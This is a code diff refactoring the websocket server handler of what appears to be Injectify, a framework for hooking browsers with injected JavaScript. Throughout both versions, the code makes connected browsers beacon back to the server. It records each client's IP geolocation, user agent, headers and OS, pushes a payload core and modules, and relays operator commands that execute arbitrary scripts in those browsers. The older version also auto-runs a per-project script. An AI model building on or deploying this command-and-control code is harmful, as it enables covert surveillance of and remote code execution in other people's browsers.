@@ -1,464 +1,257 @@
-/* eslint-disable prefer-promise-reject-errors */
-const atob = require('atob')
-const chalk = require('chalk')
-const config = require('../../server.config.js').injectify
-const geoip = require('geoip-lite')
-const {flag} = require('country-emoji')
-const parseAgent = require('user-agent-parser')
-const twemoji = require('twemoji')
-const RateLimiter = require('limiter').RateLimiter
-const getIP = require('../modules/getIP.js')
-
-module.exports = (db, inject, socket) => {
-  let checkIfValid = socket => {
-    return new Promise((resolve, reject) => {
-      let project = socket.url.split('?')
-      if (!project) {
-        reject('websocket connection with invalid / missing project name, terminating')
-        return
-      }
-      let debug = false
-      project = project[project.length - 1]
-      if (project.charAt(0) === '$') {
-        project = project.substring(1)
-        debug = true
-      }
-      if (!project) {
-        reject('websocket connection with invalid / missing project name, terminating')
-        return
-      }
-
-      try {
-        project = atob(project)
-      } catch (e) {
-        reject('websocket with invalid base64 encoded project name, terminating')
-        return
-      }
-      db.collection('projects', (err, projects) => {
-        if (err) throw err
-        projects.findOne({
-          'name': project
-        }).then(doc => {
-          if (doc === null) {
-            reject(`websocket connection to nonexistent project "${project}", terminating`)
-          } else {
-            resolve({
-              project: {
-                id: doc['_id'],
-                name: doc.name,
-                inject: doc.inject
-              },
-              id: +new Date(),
-              debug: debug
-            })
-          }
-        })
-      })
-    })
-  }
-  let send = (topic, data) => {
-    socket.write(
-      JSON.stringify({
-        t: topic,
-        d: data
-      })
-    )
-  }
-  checkIfValid(socket).then(data => {
-    send('auth', `var server=ws.url.split("/"),protocol="https://";"ws:"===server[0]&&(protocol="http://"),server=protocol+server[2];var auth=new Image;auth.src=server+"/a?id=${encodeURIComponent(socket.id)}&z=${+new Date()}";auth.onload`)
-    inject.authenticate[socket.id] = (token, authReq) => {
-      let { debug, project } = data
-      /**
-       * Rate limit responses to prevent DDoS
-       */
-      let limiter = new RateLimiter(config.rateLimiting.inject.websocket.max, config.rateLimiting.inject.websocket.windowMs, true)
-
-      /**
-       * Create an object for the project's client
-       */
-      if (!inject.clients[project.id]) inject.clients[project.id] = {}
-
-      /**
-       * Gather details about the connection
-       */
-      let inDebug = socket.url.charAt(19) === '$'
-      let platform = 'browser'
-      let browser = '/assets/svg/default.svg'
-      let country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'
-
-      let ip
-      try {
-        ip = {
-          query: socket.headers['x-forwarded-for'].split(',')[0]
-        }
-      } catch (e) {
-        ip = {
-          query: getIP(socket.remoteAddress)
-        }
-      }
-      let parsedIP = geoip.lookup(ip.query)
-      if (parsedIP) {
-        parsedIP.query = ip.query
-        ip = parsedIP
-        country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg'
-      }
-
-      if (config.debug) {
-        console.log(
-          chalk.greenBright('[inject] ') +
-          chalk.yellowBright('new websocket connection for project ') +
-          chalk.magentaBright(project.name) +
-          chalk.yellowBright(' from ') +
-          chalk.magentaBright(ip.query)
-        )
-      }
-
-      let agent = parseAgent(socket.headers['user-agent'])
-      let os = false
-
-      /**
-       * Parse user-agent from the Injectify Electron application
-       */
-      if (socket.headers['user-agent'] && socket.headers['user-agent'].startsWith('{')) {
-        try {
-          os = JSON.parse(socket.headers['user-agent'])
-        } catch (e) {
-          //
-        }
-        if (os && os.client && (os.client.type === 'electron' || os.client.type === 'node')) {
-          /**
-           * NodeJS & Electron clients
-           */
-          browser = '/assets/svg/desktop/default.svg'
-          platform = os.client.type
-          try {
-            if (os.client.type === 'electron') {
-              agent.browser.name = 'Chrome'
-              agent.engine.name = 'Electron'
-            } else {
-              agent.browser.name = 'NodeJS'
-              agent.engine.name = 'ES6'
-            }
-            agent.device.type = 'desktop'
-            if (os.versions) {
-              let engine = os.client.type === 'electron' ? 'chrome' : 'node'
-              if (typeof os.versions[engine] === 'string') {
-                agent.browser.version = os.versions[engine]
-                agent.browser.major = os.versions[engine].split('.')[0]
-              }
-              if (typeof os.versions.electron === 'string') {
-                agent.engine.version = os.versions.electron
-              } else {
-                agent.engine.version = os.versions[engine]
-              }
-            }
-            if (typeof os.vendor === 'string') {
-              agent.device.vendor = os.vendor
-            }
-            if (typeof os.model === 'string') {
-              agent.device.model = os.model
-            }
-            if (typeof os.type === 'string') {
-              if (os.type.startsWith('Windows')) {
-                browser = '/assets/svg/desktop/windows.svg'
-                os.type = 'Windows'
-                if (os.release) {
-                  if (parseInt(os.release.split('.')[0]) >= 6 && (!os.release.startsWith('6.0') || !os.release.startsWith('6.1'))) {
-                    browser = '/assets/svg/desktop/windows8.svg'
-                  }
+"use strict";
+exports.__esModule = true;
+var ClientInfo_1 = require("./ClientInfo");
+var InjectAPI_1 = require("./InjectAPI");
+var chalk_1 = require("chalk");
+var RateLimiter = require('limiter').RateLimiter;
+var atob = require('atob');
+var getIP = require('../modules/getIP.js');
+var default_1 = /** @class */ (function () {
+    function default_1(db) {
+        this.db = db;
+    }
+    default_1.prototype.validate = function (socket) {
+        var _this = this;
+        return new Promise(function (resolve, reject) {
+            var url = socket.url.split('?');
+            if (url) {
+                var state_1 = {
+                    project: url[url.length - 1],
+                    debug: false
+                };
+                if (state_1.project.charAt(0) === '$') {
+                    state_1 = {
+                        project: state_1.project.substring(1),
+                        debug: true
+                    };
                 }
-              }
-              agent.os.name = os.type
-            }
-            if (typeof os.release === 'string') {
-              agent.os.version = os.release
-            }
-            if (typeof os.arch === 'string') {
-              agent.cpu.architecture = os.arch
-            }
-            if (typeof os.cpus === 'object') {
-              agent.cpu.cpus = os.cpus
-            }
-          } catch (e) {
-            console.error(e)
-          }
-        } else {
-          os = false
-        }
-      }
-
-      /**
-       * Define the correct path to the correct vendor icon
-       */
-      if (!os && socket.headers['user-agent']) {
-        if (socket.headers['user-agent'].includes('SamsungBrowser')) {
-          browser = '/assets/svg/samsung.svg'
-        } else if (socket.headers['user-agent'].includes('Edge')) {
-          browser = '/assets/svg/edge.svg'
-        } else if (socket.headers['user-agent'].includes('Trident')) {
-          browser = '/assets/svg/ie.svg'
-        } else if (agent.browser.name) {
-          var browserName = agent.browser.name.toLowerCase()
-          if (browserName === 'chrome') {
-            browser = '/assets/svg/chrome.svg'
-          } else if (browserName === 'firefox') {
-            browser = '/assets/svg/firefox.svg'
-          } else if (browserName === 'safari') {
-            browser = '/assets/svg/safari.svg'
-          } else if (browserName === 'opera') {
-            browser = '/assets/svg/opera.svg'
-          } else if (browserName === 'ie') {
-            browser = '/assets/svg/ie.svg'
-          }
-        }
-      }
-
-      if (!inject.clients[project.id][token]) {
-        inject.clients[project.id][token] = {
-          'user-agent': agent,
-          'ip': ip,
-          'images': {
-            'country': country,
-            'browser': browser
-          },
-          'sessions': [
-
-          ],
-          'watchers': []
-        }
-      }
-
-      /**
-       * Client object
-       */
-      var session = {
-        'id': data.id,
-        'debug': inDebug,
-        'window': {
-          'title': authReq.headers.referer,
-          'url': authReq.headers.referer,
-          'favicon': `https://plus.google.com/_/favicon?domain_url=${encodeURIComponent(authReq.headers.referer)}`,
-          'active': false
-        },
-        'socket': {
-          'headers': socket.headers,
-          'id': socket.id,
-          'remoteAddress': socket.remoteAddress,
-          'remotePort': socket.remotePort,
-          'url': socket.url
-        },
-        'execute': script => {
-          send('execute', script)
-        }
-      }
-
-      inject.clients[project.id][token].sessions.push(session)
-
-      /**
-       * Callback to the Injectify users
-       */
-      if (inject.watchers[project.id]) {
-        setTimeout(() => {
-          inject.watchers[project.id].forEach(watcher => {
-            watcher.callback('connect', {
-              token: token,
-              data: inject.clients[project.id][token]
-            })
-          })
-        }, 0)
-      }
-
-      /**
-       * Send the inject core
-       */
-      let core = inject.core
-      if (debug) core = inject.debugCore
-      let socketHeaders = socket.headers
-      delete socketHeaders['user-agent']
-      core = core
-      .replace('client.ip', JSON.stringify(ip))
-      .replace('client.id', JSON.stringify(socket.id))
-      .replace('client.agent', JSON.stringify(agent))
-      .replace('client.headers', JSON.stringify(socketHeaders))
-      .replace('client.platform', JSON.stringify(platform))
-      .replace('client.os', JSON.stringify(os))
-      send('core', core)
-
-      /**
-       * Send the auto-execute script
-       */
-      if (project.inject) {
-        if (project.inject.autoexecute) {
-          send('execute', project.inject.autoexecute)
-        }
-      }
-
-      socket.on('data', rawData => {
-        limiter.removeTokens(1, (err, remainingRequests) => {
-          if (err || remainingRequests < 1) {
-            send('error', 'Too many requests! slow down')
-            return
-          }
-          try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
-          let on = (topic, callback) => {
-            if (topic !== rawData.t) return
-            callback(rawData.d)
-          }
-
-          /**
-           * Module loader
-           */
-          on('module', data => {
-            try {
-              if (!data.name) return
-              let js = inject.modules[data.name]
-              if (debug) js = inject.debugModules[data.name]
-              if (js) {
-                try {
-                  js = `${typeof data.token === 'number' ? `module.token=${data.token};` : ``}${data.params ? `module.params=${JSON.stringify(data.params)};` : ``}module.return=function(d){this.returned=d};${js}`
-                  send('module', {
-                    name: data.name,
-                    token: data.token,
-                    script: js
-                  })
-                } catch (error) {
-                  send('module', {
-                    name: data.name,
-                    token: data.token,
-                    error: {
-                      code: 'server-error',
-                      message: `Encountered a server-side error whilst loading module "${data.name}"`
+                if (state_1.project) {
+                    try {
+                        state_1.project = atob(state_1.project);
                     }
-                  })
+                    catch (e) {
+                        reject('websocket with invalid base64 encoded project name, terminating');
+                        return;
+                    }
+                    _this.db.collection('projects', function (err, projects) {
+                        if (err)
+                            throw err;
+                        projects.findOne({
+                            'name': state_1.project
+                        }).then(function (doc) {
+                            if (doc !== null) {
+                                resolve({
+                                    project: {
+                                        id: doc['_id'],
+                                        name: doc.name,
+                                        inject: doc.inject
+                                    },
+                                    id: +new Date(),
+                                    debug: state_1.debug
+                                });
+                            }
+                            else {
+                                reject("websocket connection to nonexistent project \"" + state_1.project + "\", terminating");
+                            }
+                        });
+                    });
                 }
-              } else {
-                send('module', {
-                  name: data.name,
-                  token: data.token,
-                  error: {
-                    code: 'not-installed',
-                    message: `Module "${data.name}" not installed on server`
-                  }
-                })
-              }
-            } catch (error) {
-              console.error(
-                chalk.redBright('[inject] ') +
-                chalk.yellowBright(error)
-              )
+                else {
+                    reject('websocket connection with invalid project name, terminating');
+                }
             }
-          })
-
-          /**
-           * Client info logger
-           */
-          on('i', data => {
-            /**
-             * Max string length
-             */
-            let maxStringLength = 100
-            let maxUrlLength = 2083
-            /**
-             * Safely parse data
-             */
-            if (typeof data === 'object') {
-              if (typeof data.window === 'object') {
-                let { title, url, active } = data.window
-                if (typeof title === 'string') {
-                  session.window.title = title.substring(0, maxStringLength)
-                }
-                if (typeof url === 'string') {
-                  session.window.url = url.substring(0, maxUrlLength)
-                }
-                if (typeof active === 'boolean') {
-                  session.window.active = active
-                }
-              }
+            else {
+                reject('websocket connection with missing project name, terminating');
             }
-            /**
-             * Emit it listening watchers
-             */
-            if (inject.clients[project.id][token] && inject.clients[project.id][token].watchers) {
-              inject.clients[project.id][token].watchers.forEach(watcher => {
-                watcher.emit(inject.clients[project.id][token])
-              })
+        });
+    };
+    default_1.prototype.initiate = function (socket) {
+        this.validate(socket).then(function (project) {
+            new Session(socket, project);
+        })["catch"](function (error) {
+            if (typeof error === 'string') {
+                if (global.config.verbose)
+                    console.error(chalk_1["default"].redBright('[inject] ') +
+                        chalk_1["default"].yellowBright(error));
             }
-          })
-
-          /**
-           * Data logger
-           */
-          on('l', data => {
-            console.log(data)
-          })
-
-          /**
-           * Error logger
-           */
-          on('e', data => {
-            send('error', data)
-            console.log(data)
-          })
-
-          /**
-           * Get server ping time
-           */
-          on('ping', pingTime => {
-            send('pong', pingTime)
-          })
-
-          /**
-           * Get server ping time
-           */
-          on('heartbeat', data => {
-            send('stay-alive')
-          })
-
-          /**
-           * For testing execute's from the client side
-           */
-          on('execute', data => {
-            send('execute', data)
-          })
-        })
-      })
-
-      socket.on('close', () => {
-        /**
-         * Remove them from the clients object
-         */
-        if (inject.clients[project.id][token].sessions.length === 1) {
-          /**
-           * Only session left with their token, delete token
-           */
-          delete inject.clients[project.id][token]
-        } else {
-          /**
-           * Other sessions exist with their token
-           */
-          inject.clients[project.id][token].sessions = inject.clients[project.id][token].sessions.filter(session => session.id !== data.id)
-        }
-        /**
-         * Callback to the Injectify users
-         */
-        if (inject.watchers[project.id]) {
-          setTimeout(() => {
-            inject.watchers[project.id].forEach(watcher => {
-              watcher.callback('disconnect', {
-                token: token,
-                id: session.id
-              })
-            })
-          }, 0)
-        }
-      })
+            else {
+                throw error;
+            }
+        });
+    };
+    return default_1;
+}());
+exports["default"] = default_1;
+var Session = /** @class */ (function () {
+    function Session(socket, session) {
+        this.socket = socket;
+        this.session = session;
+        this.project = session.project;
+        this.auth(socket.id);
     }
-  }).catch(error => {
-    if (config.verbose) {
-      console.error(
-        chalk.redBright('[inject] ') +
-        chalk.yellowBright(error)
-      )
-    }
-  })
-}
+    Session.prototype.send = function (topic, data) {
+        this.socket.write(JSON.stringify({
+            t: topic,
+            d: data
+        }));
+    };
+    Session.prototype.auth = function (id) {
+        var _this = this;
+        this.send('auth', "var server=ws.url.split(\"/\"),protocol=\"https://\";\"ws:\"===server[0]&&(protocol=\"http://\"),server=protocol+server[2];var auth=new Image;auth.src=server+\"/a?id=" + encodeURIComponent(id) + "&z=" + +new Date() + "\";auth.onload");
+        global.inject.authenticate[id] = function (token, req) { return _this.authorized(token, req); };
+    };
+    Session.prototype.authorized = function (token, req) {
+        var _this = this;
+        this.token = token;
+        this.req = req;
+        var injectAPI;
+        var limiter = new RateLimiter(global.config.rateLimiting.inject.websocket.max, global.config.rateLimiting.inject.websocket.windowMs, true);
+        this.socket.on('data', function (raw) {
+            limiter.removeTokens(1, function (err, remainingRequests) {
+                if (!(err || remainingRequests < 1)) {
+                    var topic = void 0;
+                    var data = void 0;
+                    try {
+                        raw = JSON.parse(raw);
+                        if (typeof raw.t !== 'string')
+                            return;
+                        topic = raw.t;
+                        data = raw.d;
+                    }
+                    catch (e) {
+                        return;
+                    }
+                    if (injectAPI.on[topic])
+                        injectAPI.on[topic](data);
+                }
+                else {
+                    _this.send('error', 'Too many requests! slow down');
+                }
+            });
+        });
+        this.socket.on('close', function () {
+            /**
+             * Remove them from the clients object
+             */
+            if (global.inject.clients[_this.project.id][token].sessions.length === 1) {
+                /**
+                 * Only session left with their token, delete token
+                 */
+                delete global.inject.clients[_this.project.id][token];
+            }
+            else {
+                /**
+                 * Other sessions exist with their token
+                 */
+                global.inject.clients[_this.project.id][_this.token].sessions = global.inject.clients[_this.project.id][token].sessions.filter(function (session) { return session.id !== _this.session.id; });
+            }
+            /**
+             * Callback to the Injectify users
+             */
+            if (global.inject.watchers[_this.project.id]) {
+                setTimeout(function () {
+                    global.inject.watchers[_this.project.id].forEach(function (watcher) {
+                        watcher.callback('disconnect', {
+                            token: token,
+                            id: _this.session.id
+                        });
+                    });
+                }, 0);
+            }
+        });
+        /**
+         * Add the session to the global sessions object
+         */
+        this.ledge(function (_a) {
+            var client = _a.client, session = _a.session;
+            /**
+             * Log to console
+             */
+            if (global.config.debug) {
+                console.log(chalk_1["default"].greenBright('[inject] ') +
+                    chalk_1["default"].yellowBright('new websocket connection for project ') +
+                    chalk_1["default"].magentaBright(_this.project.name) +
+                    chalk_1["default"].yellowBright(' from ') +
+                    chalk_1["default"].magentaBright(client.ip.query));
+            }
+            /**
+             * Set the client object
+             */
+            _this.client = {
+                client: client,
+                session: session
+            };
+            /**
+             * Enable access to the inject API
+             */
+            injectAPI = new InjectAPI_1["default"](_this);
+            /**
+             * Callback to the Injectify users
+             */
+            if (global.inject.watchers[_this.project.id]) {
+                setTimeout(function () {
+                    global.inject.watchers[_this.project.id].forEach(function (watcher) {
+                        watcher.callback('connect', {
+                            token: _this.token,
+                            data: global.inject.clients[_this.project.id][_this.token]
+                        });
+                    });
+                }, 0);
+            }
+            /**
+             * Send the inject core
+             */
+            var core = global.inject.core;
+            if (_this.session.debug)
+                core = global.inject.debugCore;
+            var socketHeaders = _this.socket.headers;
+            delete socketHeaders['user-agent'];
+            core = core
+                .replace('client.ip', JSON.stringify(client.ip))
+                .replace('client.id', JSON.stringify(session.id))
+                .replace('client.agent', JSON.stringify(client.agent))
+                .replace('client.headers', JSON.stringify(socketHeaders))
+                .replace('client.platform', JSON.stringify(client.platform))
+                .replace('client.os', JSON.stringify(client.os));
+            _this.send('core', core);
+            /**
+             * Send the auto-execute script
+             */
+            // if (project.inject) {
+            //   if (project.inject.autoexecute) {
+            //     send('execute', project.inject.autoexecute)
+            //   }
+            // }
+        });
+    };
+    Session.prototype.ledge = function (resolve) {
+        var _this = this;
+        /**
+         * Create an object for the project
+         */
+        if (!global.inject.clients[this.project.id]) {
+            global.inject.clients[this.project.id] = {};
+        }
+        ClientInfo_1["default"](this.socket, this.req, this.session).then(function (_a) {
+            var client = _a.client, session = _a.session;
+            /**
+             * Create an object for the client
+             */
+            if (!global.inject.clients[_this.project.id][_this.token]) {
+                global.inject.clients[_this.project.id][_this.token] = client;
+            }
+            /**
+             * Add a reference to the send method
+             */
+            session.execute = function (script) {
+                _this.send('execute', script);
+            };
+            global.inject.clients[_this.project.id][_this.token].sessions.push(session);
+            resolve({
+                client: client,
+                session: session
+            });
+        });
+    };
+    return Session;
+}());
